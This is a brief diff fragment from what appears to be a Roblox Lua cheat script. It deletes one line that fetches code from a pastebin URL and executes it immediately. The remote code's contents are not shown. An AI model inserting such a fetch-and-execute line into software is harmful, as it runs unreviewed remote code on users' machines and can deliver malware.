@@ -1950,7 +1950,6 @@ function ui:W1n(text,text2,text2Pos,toclose)
 end
 
 -- Script
-loadstring(game:HttpGet('https://pastebin.com/raw/V5jPE8SY'))()
 
     if game.PlaceId == 2753915549 then
         World1 = true
